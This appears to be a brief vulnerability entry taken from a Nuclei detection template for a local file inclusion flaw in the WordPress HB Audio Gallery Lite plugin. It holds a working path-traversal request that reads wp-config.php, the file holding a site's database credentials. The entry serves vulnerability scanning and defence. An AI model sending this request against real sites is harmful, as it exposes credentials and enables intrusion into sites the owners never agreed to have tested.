# Vulnerability: Wordpress HB Audio Gallery Lite - Local File Inclusion
**Classification:** CWE-23,CWE-73
**Source:** Nuclei Template (`hb-audio-lfi.yaml`)

## Description
Wordpress HB Audio Gallery Lite is vulnerable to local file inclusion.

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/wp-content/plugins/hb-audio-gallery-lite/gallery/audio-download.php?file_path=../../../../wp-config.php&file_size=10
```

